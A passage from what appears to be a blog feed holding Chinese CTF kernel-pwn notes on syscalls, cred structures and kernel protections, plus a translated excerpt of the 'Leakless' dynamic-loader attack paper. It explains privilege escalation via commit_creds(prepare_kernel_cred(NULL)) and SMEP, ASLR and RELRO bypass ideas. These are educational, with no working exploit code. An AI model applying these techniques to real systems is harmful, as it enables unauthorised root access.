—&gt; 用户态"></a>内核态 —&gt; 用户态</h4><p>由内核态重新“着陆”回用户态只需要恢复用户空间信息即可：</p><ul><li><code>swapgs</code>指令恢复用户态GS寄存器</li><li><code>sysretq</code>或者<code>iretq</code>恢复到用户空间</li></ul><h2 id="三、系统调用"><a href="#三、系统调用" class="headerlink" title="三、系统调用"></a>三、系统调用</h2><p><strong>系统调用</strong>（<strong>system call</strong>）是由操作系统内核向上层应用程式提供的应用接口，操作系统负责调度一切的资源，当用户进程想要请求更高权限的服务时，便需要通过由系统提供的应用接口，使用系统调用以<strong>陷入内核态，再由操作系统完成请求</strong></p><p>系统调用本质上与一般的C库函数没有区别，不同的是系统调用位于内核空间，以内核态运行</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13368529740/0" alt="image-20210403004923246"></p><blockquote><p>Windows系统下将系统调用封装在win32 API中，不过本文主要讨论Linux</p></blockquote><h3 id="系统调用表"><a href="#系统调用表" class="headerlink" title="系统调用表"></a>系统调用表</h3><p>所有的系统调用被声明于内核源码<code>arch/x86/entry/syscalls/syscall_64.tbl</code>中，在该表中声明了系统调用的标号、类型、名称、内核态函数名称</p><p>在内核中使用<code>系统调用表（System Call Table）</code>对系统调用进行索引，该表中存储了不同标号的系统调用函数的地址</p><h3 id="进入系统调用"><a href="#进入系统调用" class="headerlink" title="进入系统调用"></a>进入系统调用</h3><p>进入系统调用有两种主要的方式：</p><ul><li>执行<code>int 0x80</code>汇编指令（80号中断）</li><li>执行<code>sysenter</code>汇编指令（only intel）</li></ul><p>接下来就是由用户态进入到内核态的流程</p><p>与一般的函数调用规范不同，Linux下的系统调用以<code>eax</code>寄存器作为<strong>系统调用号</strong>，<code>ebx、ecx、edx、esi、edi、ebp</code>作为第一个参数、第二个参数…进行参数传递</p><h3 id="退出系统调用"><a href="#退出系统调用" class="headerlink" title="退出系统调用"></a>退出系统调用</h3><p>同样地，退出系统调用也有对应的两种方式：</p><ul><li>执行<code>iret</code>汇编指令</li><li>执行<code>sysexit</code>汇编指令（only Intel）</li></ul><p>接下来就是由内核态回退至用户态的流程</p><h2 id="四、进程权限管理"><a href="#四、进程权限管理" class="headerlink" title="四、进程权限管理"></a>四、进程权限管理</h2><p>前面我们讲到，kernel调度着一切的系统资源，并为用户应用程式提供运行环境，相应地，应用程式的权限也都是由kernel进行管理的</p><h3 id="进程描述符（process-descriptor）"><a href="#进程描述符（process-descriptor）" class="headerlink" title="进程描述符（process descriptor）"></a>进程描述符（process descriptor）</h3><p>在内核中使用结构体<code>task_struct</code>表示一个进程，该结构体定义于内核源码<code>include/linux/sched.h</code>中</p><p>一个进程描述符的结构应当如下图</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13370298871/0" alt="image-20210403170639762"></p><p>本篇我们主要关心其对于进程权限的管理</p><p>注意到<code>task_struct</code>的源码中有如下代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">cred</span>;</span></span><br></pre></td></tr></table></figure><p><strong>Process credentials</strong>是kernel用以判断一个进程权限的凭据，在kernel中使用<code>cred</code>结构体进行标识，对于一个进程而言应当有三个cred：</p><ul><li><strong>ptracer_cred：</strong>使用<code>ptrace</code>系统调用跟踪该进程的上级进程的cred（gdb调试便是使用了这个系统调用，常见的反调试机制的原理便是提前占用了这个位置）</li><li><strong>real_cred：</strong>该进程的真实cred，通常是一个进程最初启动时所具有的权限</li><li><strong>cred： 该进程的有效cred，kernel以此作为进程权限的凭据</strong></li></ul><h4 id="cred结构体"><a href="#cred结构体" class="headerlink" title="cred结构体"></a>cred结构体</h4><p>对于一个进程，在内核当中使用一个结构体<code>cred</code>管理其权限，该结构体定义于内核源码<code>include/linux/cred.h</code>中，如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line"><span class="keyword">atomic_t</span>usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line"><span class="keyword">atomic_t</span>subscribers;<span class="comment">/* number of processes subscribed */</span></span><br><span class="line"><span class="keyword">void</span>*put_addr;</span><br><span class="line"><span class="keyword">unsigned</span>magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">kuid_t</span>uid;<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>gid;<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>suid;<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>sgid;<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>euid;<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>egid;<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>fsuid;<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="keyword">kgid_t</span>fsgid;<span class="comment">/* GID for VFS ops */</span></span><br><span class="line"><span class="keyword">unsigned</span>securebits;<span class="comment">/* SUID-less security management */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_permitted;<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_effective;<span class="comment">/* caps we can actually use */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_bset;<span class="comment">/* capability bounding set */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_ambient;<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>jit_keyring;<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment"> * keys to */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">void</span>*security;<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span><span class="comment">/* real user ID subscription */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span><span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line"><span class="comment">/* RCU deletion */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> non_rcu;<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>我们主要关注<code>cred</code>结构体中管理权限的变量</p><h4 id="用户ID-amp-组ID"><a href="#用户ID-amp-组ID" class="headerlink" title="用户ID &amp; 组ID"></a>用户ID &amp; 组ID</h4><p>一个cred结构体中记载了<strong>一个进程四种不同的用户ID</strong>：</p><ul><li><strong>真实用户ID</strong>（real UID）：标识一个<strong>进程启动时的用户ID</strong></li><li><strong>保存用户ID</strong>（saved UID）：标识一个<strong>进程最初的有效用户ID</strong></li><li><strong>有效用户ID</strong>（effective UID）：标识一个进程<strong>正在运行时所属的用户ID</strong>，一个进程在运行途中是可以改变自己所属用户的，因而权限机制也是通过有效用户ID进行认证的</li><li><strong>文件系统用户ID</strong>（UID for VFS ops）：标识一个进程<strong>创建文件时进行标识的用户ID</strong></li></ul><p>在通常情况下这几个ID应当都是相同的</p><p>用户组ID同样分为四个：<code>真实组ID</code>、<code>保存组ID</code>、<code>有效组ID</code>、<code>文件系统组ID</code>，与用户ID是类似的，这里便不再赘叙</p><h3 id="进程权限改变"><a href="#进程权限改变" class="headerlink" title="进程权限改变"></a>进程权限改变</h3><p>前面我们讲到，一个进程的权限是由位于内核空间的<code>cred</code>结构体进行管理的，那么我们不难想到：只要改变一个进程的<code>cred</code>结构体，就能改变其执行权限</p><p>在内核空间有如下两个函数，都位于kernel/cred.c中：</p><ul><li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>：该函数用以拷贝一个进程的cred结构体，并返回一个新的cred结构体，需要注意的是<code>daemon</code>参数应为<strong>有效的进程描述符地址或NULL</strong></li><li><code>int commit_creds(struct cred *new)</code>：该函数用以将一个新的<code>cred</code>结构体应用到进程</li></ul><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>查看<code>prepare_kernel_cred()</code>函数源码，观察到如下逻辑：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">struct cred *<span class="title">prepare_kernel_cred</span><span class="params">(struct task_struct *daemon)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"><span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (daemon)</span><br><span class="line">old = get_task_cred(daemon);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">old = get_cred(&amp;init_cred);</span><br><span class="line"></span><br><span class="line">validate_creds(old);</span><br><span class="line"></span><br><span class="line">*<span class="keyword">new</span> = *old;</span><br><span class="line"><span class="keyword">new</span>-&gt;non_rcu = <span class="number">0</span>;</span><br><span class="line">atomic_set(&amp;<span class="keyword">new</span>-&gt;usage, <span class="number">1</span>);</span><br><span class="line">set_cred_subscribers(<span class="keyword">new</span>, <span class="number">0</span>);</span><br><span class="line">get_uid(<span class="keyword">new</span>-&gt;user);</span><br><span class="line">get_user_ns(<span class="keyword">new</span>-&gt;user_ns);</span><br><span class="line">get_group_info(<span class="keyword">new</span>-&gt;group_info);</span><br></pre></td></tr></table></figure><p>在<code>prepare_krenel_cred()</code>函数中，若传入的参数为NULL，则会缺省使用<code>init</code>进程的<code>cred</code>作为模板进行拷贝，<strong>即可以直接获得一个标识着root权限的cred结构体</strong></p><p>那么我们不难想到，只要我们能够在内核空间执行<code>commit_creds(prepare_kernel_cred(NULL))</code>，那么就能够将进程的权限提升到<code>root</code></p><h2 id="五、I-O"><a href="#五、I-O" class="headerlink" title="五、I/O"></a>五、I/O</h2><p>Linux追求高层次抽象上的统一，其设计哲学之一便是<code>万物皆文件</code></p><h3 id="“万物皆文件”"><a href="#“万物皆文件”" class="headerlink" title="“万物皆文件”"></a>“万物皆文件”</h3><p>Linux设计的哲学之一——<code>万物皆文件</code>，在Linux系统的视角下，无论是文件、设备、管道还是目录、进程，甚至是磁盘，套接字等等，一切都可以被抽象为文件，<strong>一切都可以使用访问文件的方式进行操作</strong></p><p>通过这样一种哲学，Linux予开发者以高层次抽象的统一性，提供了<code>操作的一致性</code>：</p><ul><li><strong>所有的读取操作都可以通过read进行</strong></li><li><strong>所有的更改操作都可以通过write进行</strong></li></ul><p>对于开发者而言，将一切的操作都统一于一个高层次抽象的应用接口，无疑是十分美妙的一件事情——<strong>我们不需要去理解实现的细节，只需要对”文件”完成简单的读写操作</strong></p><blockquote><p>例如，在较老版本的Linux中，可以使用cat /dev/urandom &gt; /dev/dsp命令令扬声器产生随机噪声</p></blockquote><h3 id="进程文件系统"><a href="#进程文件系统" class="headerlink" title="进程文件系统"></a>进程文件系统</h3><p>进程文件系统（process file system，简写为procfs）用以描述一个进程，其中包括该进程所打开的文件描述符、堆栈内存布局、环境变量等等</p><p>进程文件系统本身是一个伪文件系统，通常被挂载到<code>/proc</code>目录下，并不真正占用存储系统，而是占用一定的内存</p><p>当一个进程被建立起来时，其进程文件系统便会被挂载到<code>/proc/[PID]</code>下，我们可以在该目录下查看其相关信息</p><h3 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h3><p>进程通过<strong>文件描述符（file descriptor）</strong>来完成对文件的访问，其在形式上是一个非负整数，本质上是对文件的索引值，进程所有执行 I/O 操作的系统调用都会通过文件描述符</p><p>每个进程都<strong>独立有着一个文件描述符表</strong>，存放着该进程所打开的文件索引，每当进程<strong>成功</strong>打开一个现有文件/创建一个新文件时（通过系统调用open进行操作），<strong>内核会向进程返回一个文件描述符</strong></p><p>在kernel中有着一个文件表，由所有的进程共享</p><h4 id="stdin、stdout、stderr"><a href="#stdin、stdout、stderr" class="headerlink" title="stdin、stdout、stderr"></a>stdin、stdout、stderr</h4><p>每个Linux进程都应当有着三个标准的POSIX文件描述符，对应着三个标准文件流：</p><ul><li><code>stdin：标准输入 - 0</code></li><li><code>stdout：标准输出 - 1</code></li><li><code>stderr：标准错误 - 2</code></li></ul><p>此后打开的文件描述符应当从<code>3</code>开始</p><h3 id="系统调用：ioctl"><a href="#系统调用：ioctl" class="headerlink" title="系统调用：ioctl"></a>系统调用：ioctl</h3><p>在Linux中一切都可以被视为文件，因而一切都可以以访问文件的方式进行操作，为了方便，Linux定义了系统调用<code>ioctl</code>供进程于设备之间进行通信</p><p>系统调用<code>ioctl</code>是一个专门于设备输入输出操作的一个系统调用，其调用方式如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ioctl</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">unsigned</span> <span class="keyword">long</span> request, ...)</span></span></span><br></pre></td></tr></table></figure><ul><li><strong>fd：设备的文件描述符</strong></li><li><strong>request：请求码</strong></li><li><strong>其他参数</strong></li></ul><p>对于一个提供了ioctl通信方式的设备而言，我们可以通过其文件描述符、使用不同的请起码及其他请求参数通过ioctl系统调用完成不同的对设备的I/O操作</p><blockquote><p>例如CD-ROM驱动程序弹出光驱的这一操作就对应着对”光驱设备”这一文件通过ioctl传递特定的请求码与请求参数完成</p></blockquote><h2 id="六、Loadable-Kernel-Modules（LKMs）"><a href="#六、Loadable-Kernel-Modules（LKMs）" class="headerlink" title="六、Loadable Kernel Modules（LKMs）"></a>六、Loadable Kernel Modules（LKMs）</h2><p>前面我们讲到，Linux Kernle采用的是宏内核架构，一切的系统服务都需要由内核来提供，虽然效率较高，但是缺乏可扩展性与可维护性，同时内核需要装载很多可能用到的服务，但这些服务最终可能未必会用到，还会占据大量内存空间，同时新服务的提供往往意味着要重新编译整个内核</p><p>综合以上考虑，<strong>可装载内核模块（Loadable Kernel Modules</strong>，简称<strong>LKMs）</strong>出现了，位于内核空间的LKMs可以提供<strong>新的系统调用</strong>或其他服务，同时LKMs可以像积木一样被装载内核/从内核中卸载，大大提高了kernel的可拓展性与可维护性</p><blockquote><p>常见的外设驱动便是LKM的一种</p></blockquote><p>LKMs与用户态可执行文件一样都采用ELF格式，但是<strong>LKMs运行在内核空间，且无法脱离内核运行</strong></p><p>通常与LKM相关的命令有以下三个：</p><ul><li><code>lsmod</code>：列出现有的LKMs</li><li><code>insmod</code>：装载新的LKM（需要root）</li><li><code>rmmod</code>：从内核中移除LKM（需要root）</li></ul><blockquote><p>CTF比赛中的kernel pwn的漏洞往往出现在第三方LKM中，<del>一般来说不会真的让你去直接日内核组件</del></p></blockquote><h2 id="七、保护机制"><a href="#七、保护机制" class="headerlink" title="七、保护机制"></a>七、保护机制</h2><p>与一般的程序相同，Linux Kernel同样有着各种各样的保护机制：</p><h3 id="KASLR"><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h3><p>KASLR即<code>内核空间地址随机化</code>（kernel address space layout randomize），与用户态程序的ASLR相类似——在内核镜像映射到实际的地址空间上加上一个偏移值，但是内核内部的相对偏移其实还是不变的</p><p>在未开启KASLR保护机制时，内核的基址为<code>0xffffffff80000000</code>，内核会占用<code>0xffffffff80000000~0xffffffffC0000000</code>这1G虚拟地址空间</p><h3 id="STACK-PROTECTOR"><a href="#STACK-PROTECTOR" class="headerlink" title="STACK PROTECTOR"></a>STACK PROTECTOR</h3><p>类似于用户态程序的canary，通常又被称作是stack cookie，用以检测<strong>是否发生内核堆栈溢出</strong>，若是发生内核堆栈溢出则会产生kernel panic</p><p>内核中的canary的值通常取自gs段寄存器某个固定偏移处的值</p><h3 id="SMAP-SMEP"><a href="#SMAP-SMEP" class="headerlink" title="SMAP/SMEP"></a>SMAP/SMEP</h3><p>SMAP即<code>管理模式访问保护</code>（Supervisor Mode Access Prevention），SMEP即<code>管理模式执行保护</code>（Supervisor Mode Execution Prevention），这两种保护通常是同时开启的，用以阻止<strong>内核空间直接访问/执行用户空间的数据</strong>，完全地将内核空间与用户空间相分隔开，用以防范ret2usr（return-to-user，将内核空间的指令指针重定向至用户空间上构造好的提权代码）攻击</p><p>SMEP保护的绕过有以下两种方式：</p><ul><li>在设计中，为了使隔离的数据进行交换时具有更高的性能，隐形地址共享始终在（VDSO &amp; VSYSCALL），<strong>用户态进程与内核共享同一块物理内存</strong>，因此通过隐形内存共享可以完整的绕过软件和硬件隔离保护，这种攻击方式被称之为<code>ret2dir</code>（return-to-direct-mappedmomory）</li><li>Intel下系统根据CR4控制寄存器的第20位标识是否开启SMEP保护（1为开启，0为关闭），若是能够通过kernel ROP改变CR4寄存器的值便能够关闭SMEP保护，完成SMEP-bypass，接下来就能够重新进行ret2usr</li></ul><h3 id="KPTI"><a href="#KPTI" class="headerlink" title="KPTI"></a>KPTI</h3><p>KPTI即<code>内核页表隔离</code>（Kernel page-table isolation），内核空间与用户空间分别使用两组不同的页表集，这对于内核的内存管理产生了根本性的变化</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-Linux-Kernel-Basic-Knowledge&quot;&gt;&lt;a href=&quot;#0x00-Linux-Kernel-Basic-Knowledge&quot; class=&quot;headerlink&quot; title=&quot;0x00.Linux Kernel Basic Kn
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://billyotry.github.io/categories/CTF/"/>
    
    
      <category term="CTF/Pwn" scheme="https://billyotry.github.io/tags/CTF-Pwn/"/>
    
  </entry>
  
  <entry>
    <title>【转载】ELF如何摧毁圣诞</title>
    <link href="https://billyotry.github.io/2021/03/17/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91ELF%E5%A6%82%E4%BD%95%E6%91%A7%E6%AF%81%E5%9C%A3%E8%AF%9E/"/>
    <id>https://billyotry.github.io/2021/03/17/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91ELF%E5%A6%82%E4%BD%95%E6%91%A7%E6%AF%81%E5%9C%A3%E8%AF%9E/</id>
    <published>2021-03-17T04:08:21.808Z</published>
    <updated>2021-03-30T02:49:48.553Z</updated>
    
    <content type="html"><![CDATA[<p>作者：Alessandro Di Federico, Amat Cama, Yan Shoshitaishvili, Christopher Kruegel and Giovanni Vigna(UCSB,CA, USA; Politecnico di Milano, Milan, Italy)</p><p>原文出自：USENIX Security 2015</p><p>翻译：裴中煜，清华大学网络研究院（本文是清华大学本科毕设要求翻译的外文文献）全部译文</p><p>==================================================================================</p><p><strong>摘要</strong></p><p>近几十年来，计算机软件经历着一场利用技术、发现与保护技术之间的军备竞赛。一些有效的保护措施（例如，ASLR地址空间布局随机化），显著地增加了成功利用一个漏洞的难度。一个现代的漏洞利用一般分为两个阶段：第一步需要进行信息泄露以取得程序的内存分布，接着第二步则进行实际的利用。然而，由于内存破坏后的具体情况各不相同，从程序中得到的内存布局的方法并不总是可行。</p><p>在这篇文章中，我们展示了一种不需要进行信息泄露，而是使用动态装载器来直接标识关键(critical)函数的位置并调用它们的技术。我们在ELF文件标准和动态装载器的实现中找到了几个弱点，这些弱点能够用来解析、执行任意库函数。因此，我们能够绕过特定的安全缓解措施，包括专门为保护ELF数据结构不被攻击者破坏而设计的partial RELRO与full RELRO。我们实现了一个名为Leakless的原型工具，并针对动态装载器的实现、之前的攻击技术和真实案例进行评估以确定我们的发现的影响。另外，Leakless也可以进行更可靠、更不具侵略性的攻击，以减少被入侵检测系统发现的几率。</p><p>==================================================================================</p><p><strong>1. 简介</strong></p><p>从1998年Morris worm发表的第一个被广泛应用的栈溢出文章[27]以来，内存破坏漏洞的保护、利用和减缓技术研究占据着安全研究人员和网络犯罪相同的时间。尽管近年来内存破坏漏洞的盛行趋势有所减缓，经典的栈溢出仍然雄踞最常见软件漏洞的第3位，而另外4种内存破坏漏洞已经跌出了前25名。</p><p>而能够刹住内存破坏之风的原因，是在内存保护与缓解措施方面的巨大投入。这些缓解措施主要应用于2个方面：系统级加固(例如CGroups [23]，Apparmor [4]，Capsicum [41]，和 GRSecurity [18])和应用级加固(如 stack canaries [3]，Address Space Layout Randomization (ASLR)，和 No-eXecute (NX) bit [8])。</p><p>尤其是地址空间布局随机化(ASLR)，通过将动态库加载到内存中随机的一块区域（对于攻击者来说未知），使得攻击者需要将利用过程分为2个阶段。在第一个阶段，攻击者必须使用一个信息泄露漏洞将程序以及动态库的内存布局泄露出来，这样就可以标识出安全关键(securtiy-critical)函数（例如system()库函数）代码的地址。在第二个阶段，攻击者使用一个控制流重定向漏洞，将程序的控制流重定向到这个函数。</p><p>然而，由于内存破坏后的具体情况各不相同，从程序中得到内存布局信息的方法并不总是可行。例如，大多数解析代码（例如解码图像或者视频）经常不会被与攻击者有直接的交互，这就排除了信息泄露的可能性。没有这些信息，再对ASLR保护下的二进制文件使用现在的技术进行利用通常是不可行或不可靠的。</p><p>就像 [36] 中写的那样，除了加固应用和系统的竞赛，对于二进制的格式以及系统组件的一些鲜为人知的角落，则缺少仔细的检查。特别地，我们着眼于操作系统中的一个用户态组件–动态装载器，负责装载二进制文件以及它们依赖的库文件到内存中。二进制文件使用动态装载器来支持导入符号的解析功能。有趣的是，这恰好就是一个面对加固应用的攻击者通过泄露库地址与内容尝试”重塑”一个符号的表现。</p><p>我们的技术的亮点，在于可以通过活用一个动态装载器的功能，完全省去对信息泄露漏洞的需要。我们的技术利用动态装载器与ELF格式的弱点，解析并执行任意库函数，允许我们在没有信息泄露的情况下成功地攻击加固后的应用。任何库函数都可以被执行，只要它所在库被加载进程序。既然所有的二进制程序都依赖于C语言库，这就表示我们的技术能执行system()和execve()这类安全关键(security-critical)函数，从而允许执行任意命令。我们还会展示一些通过重用特定应用程序库中的函数来进行复杂又隐秘的攻击。这项技术非常可靠且架构无关，攻击者不需要知道版本、布局、内容或者其他关于库函数不可知的信息。</p><p>我们实现了自己的想法，写成了一个成为Leakless的原型工具。要使用Leakless，攻击者必须拥有目标应用的副本，且能够利用漏洞（即劫持控制流）。之后，Leakless可以在没有信息泄露的情况下自动地创建利用过程，并且调用攻击者感兴趣的关键库函数。</p><p>为了评估我们技术的影响，我们对几个不同的Linux(以及FreeBSD)发行版进行了调研，发现其中大部分的二进制程序容易被Leakless的攻击所影响（如果目标程序又内存破坏漏洞的话）。我们还审查了多种C语言库的动态装载器实现，发现其中大多数也是容易被Leakless的技术影响的。除此之外，我们展示了一种流行的缓解技术，RELocation Read-Only (RELRO) 重定位只读，它能够保护库函数的调用不受攻击者重定向的影响。然而它也被Leakless完全的绕过了。最后，我们比较了Leakless与类似的ROP编译器产生的ROP链的长度。Leakless产生的ROP链的长度显著地短于现有技术产生的ROP链。就像我们展示的那样，与传统ROP编译器相比Leakless能够实现更加广泛的利用。</p><p>总的来说，我们做出了如下贡献：</p><p>-我们开发了一个新的、架构与平台无关的攻击，使用基于ELF、支持动态装载的系统的固有功能，使得攻击者能够在不做信息泄露的情况下，执行任意库函数。</p><p>-我们详述了实现自己的系统的过程中，面对不同动态装载器实现和多种缓解措施(包括RELRO)的挑战，并最终克服了它们。</p><p>-最后，我们进行了一次深入的评估，包括以前复杂的利用因使用了我们的技术变得容易的案例分析，对几种不同动态装载器实现安全性的评定，我们的技术在不同操作系统配置下适用性的调研，以及Leakless在ROP链长度改善方面的测量。</p><p>==================================================================================</p><p><strong>2. 相关工作：内存破坏的军备竞赛</strong></p><p>内存破坏的军备竞赛(即防御者针对现有的利用技术开发对抗措施，接着攻击者想出新的利用技术来绕过这些措施的过程)已经持续了几十年。这场竞赛的历史已经被记录在别处 [37]，这一节着眼于那些使得现代利用技术被拆分成2个阶段的事件，就是说，需要攻击者在执行任意代码前进行信息泄露这一步。</p><p>早期的栈溢出利用依赖于向缓冲区注入二进制代码(称为shellcode)的能力，并需要覆盖在栈上的一个返回地址使其指向这个缓冲区。随后，当程序从当前函数返回时，执行流就会被重定向到攻击者的shellcode，接着攻击者就能取得程序的控制权。</p><p>结果，安全研究者提出了另一项减缓技术：不可执行位(the NX bit)。不可执行位具有防止那些不该有代码的区域(栈就是典型的这类区域)被执行的效果。</p><p>不可执行位逼迫攻击者们开始采用”代码重用”的理念：使用程序中已经存在的代码(例如系统调用或安全关键(security-critical)库函数)来达到它们的目的。在return-to-libc的利用中 [30,39]，一个攻击者将控制流重定向到一个敏感的libc函数(例如system())，并给予其恰当的参数来实行恶意的行为，而不是注入shellcode。</p><p>为了对抗这项技术，一项系统级的加固措施，称为地址空间布局随机化ASLR被开发出来。一旦ASLR起作用，攻击者将无法知道库的位置。实际上，程序的内存布局(库被加载的位置，栈的位置以及堆的地址)每次执行都是随机的。因此，攻击者不知道将控制流重定向到哪里才能执行特定函数。更糟糕的是，即使是攻击者能够确定这些信息，他仍然不知道特定函数在库中的位置，除非他取得库文件的一份副本。结果，攻击者常常需要泄露库本身的内容并解析代码来确定关键函数的位置。为了泄露库，攻击者需要重用一些程序代码中的小块代码(称为gadgets)来泄露内存位置。这些gadget可以通过将其地址写在栈上并连续地执行返回(ret)指令被组合使用。所以，这项技术被称作”面向返回编程”(Return Oriented Programming (ROP))。</p><p>ROP是攻击者的一个强有力的工具。实际上，在许多二进制程序中发现的ROP Gadgets是”图灵完全”集合，借助ROP编译器能够完成利用的任务。然而，由于其普适性的需要，ROP编译器倾向于生成依赖于具体漏洞细节的长ROP链，它们”太长而无用” [22]。在这之后，我们将展示Leakless生成的相对短的ROP链，并且依赖于存在的缓解措施，只需要很少的gadgets。此外，Leakless在没有图灵完全的Gadgets的集合的情况下也能发挥作用。</p><p>在真实世界的利用中，攻击者往往使用一个信息泄露攻击来泄露库的地址或内容，然后使用这些信息来计算安全关键(security-critical)函数(例如system())的地址，最后发送第二段攻击载荷(payload)到漏洞应用来重定向控制流到想要的函数。</p><p>实际上，我们观察到寻找特定库函数的目标已经被动态装载器实现了，这是一个能够进行符号解析(即确定库函数地址)的操作系统组件。所以，我们意识到可以使用动态装载器来略过信息泄露这一步并巧妙地进行利用。因为我们的攻击不需要信息泄露的步骤，所以我们称它为Leakless。</p><p>使用动态链接器的观念已经在一些return-to-libc的攻击中作为利用过程的一部分被简要地探究过 [15,21,30]。然而，现有的技术非常依赖现有状况，依赖平台，需要两个阶段，或者易受到现有的缓解技术(例如RELRO)的影响，这一影响我们将在后面讨论。而Leakless，作为只有一个阶段，平台无关，具有普适性的技术，在折一的缓解技术面前仍然能够发挥作用。</p><p>在下一节中，我们将阐述动态装载器是如何工作的，然后将会展示如何活用它的功能来进行我们的攻击。</p><p>==================================================================================</p><p><strong>3. 动态装载器</strong></p><p>动态装载器是一个用户执行环境的组件，它能够帮助在开始时加载应用需要的库并解析库导出的动态符号(函数和全局变量)供应用程序使用。在这一节中，我们将会阐述动态符号解析的过程在基于ELF的系统上是如何工作的 